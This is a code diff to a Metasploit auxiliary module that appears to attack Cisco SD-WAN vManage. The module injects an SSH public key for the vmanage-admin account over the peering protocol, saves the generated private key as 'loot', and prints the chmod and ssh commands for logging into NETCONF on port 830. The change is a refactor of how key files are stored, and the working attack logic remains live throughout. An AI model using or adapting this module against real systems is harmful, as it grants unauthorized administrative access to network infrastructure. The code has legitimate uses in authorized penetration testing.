@@ -58,8 +58,7 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(12346),
         OptInt.new('DOMAIN_ID', [true, 'SD-WAN domain ID', 1]),
         OptInt.new('SITE_ID', [true, 'SD-WAN site ID', 100]),
-        OptPath.new('SSH_PUBLIC_KEY_FILE', [false, 'Path to an existing SSH public key file to inject']),
-        OptPath.new('STORE_SSH_KEY_FILES', [false, 'Directory to store generated SSH key files', Dir.tmpdir])
+        OptPath.new('SSH_PUBLIC_KEY_FILE', [false, 'Path to an existing SSH public key file to inject'])
       ]
     )
   end
@@ -259,58 +258,26 @@ class MetasploitModule < Msf::Auxiliary
 
     send_message(ssl, wbio, udp_sock, MSG_VMANAGE_TO_PEER, key_body, silent: silent)
 
-    privkey_path = nil
-
     if datastore['SSH_PUBLIC_KEY_FILE']
-      # If we are using an existing key suplied by the user, just show how to connect to the NETCONF service.
+      # If we are using an existing key supplied by the user, just show how to connect to the NETCONF service.
       print_good("Use: ssh -i <SSH_PRIVATE_KEY_FILE> vmanage-admin@#{rhost} -p 830") unless silent
     else
-      # If we generated a new key pain, store the private key as loot and write files
-      # Generate unique ID for filenames
-      key_id = "#{rhost}_#{rport}_#{Time.now.to_i}"
+      # Write SSH key files to loot directory
+      loot_path = store_loot(
+        'cisco.sdwan.sshkey',
+        'application/x-pem-file',
+        rhost,
+        ssh_privkey_pem,
+        'sdwan_ssh_key.pem',
+        'SSH private key for vmanage-admin access'
+      )
 
-      # Write SSH key files to STORE_SSH_KEY_FILES directory
-      if datastore['STORE_SSH_KEY_FILES']
-        begin
-          key_dir = datastore['STORE_SSH_KEY_FILES']
-          FileUtils.mkdir_p(key_dir) unless File.directory?(key_dir)
-
-          privkey_filename = "sdwan_ssh_key_#{key_id}"
-          pubkey_filename = "#{privkey_filename}.pub"
-          privkey_path = File.join(key_dir, privkey_filename)
-          pubkey_path = File.join(key_dir, pubkey_filename)
-
-          File.write(privkey_path, ssh_privkey_pem)
-          File.chmod(0o600, privkey_path)
-          File.write(pubkey_path, ssh_pubkey)
-
-          print_status("SSH private key saved to: #{privkey_path}") unless silent
-          print_status("SSH public key saved to: #{pubkey_path}") unless silent
-        rescue ::StandardError => e
-          print_error("Failed to write SSH key files: #{e.message}") unless silent
-        end
-      end
-
-      # Also store as loot (if database is available)
-      begin
-        loot_path = store_loot(
-          'cisco.sdwan.sshkey',
-          'application/x-pem-file',
-          rhost,
-          ssh_privkey_pem,
-          'sdwan_ssh_key.pem',
-          'SSH private key for vmanage-admin access'
-        )
-        print_status("SSH private key saved to loot: #{loot_path}") unless silent
-      rescue ::StandardError => e
-        vprint_status("Could not store loot (database may not be available): #{e.message}") unless silent
-      end
-
-      # Provide connection instructions
-      if privkey_path
-        print_good("Use: ssh -i #{privkey_path} vmanage-admin@#{rhost} -p 830") unless silent
-      else
-        print_good("Use: ssh -i <path_to_private_key> vmanage-admin@#{rhost} -p 830") unless silent
+      unless silent
+        print_status("SSH private key saved to loot: #{loot_path}")
+        # Provide connection instructions
+        print_good('Connect to NETCONF via:')
+        print_line("chmod 600 #{loot_path}")
+        print_line("ssh -i #{loot_path} vmanage-admin@#{rhost} -p 830")
       end
     end
 
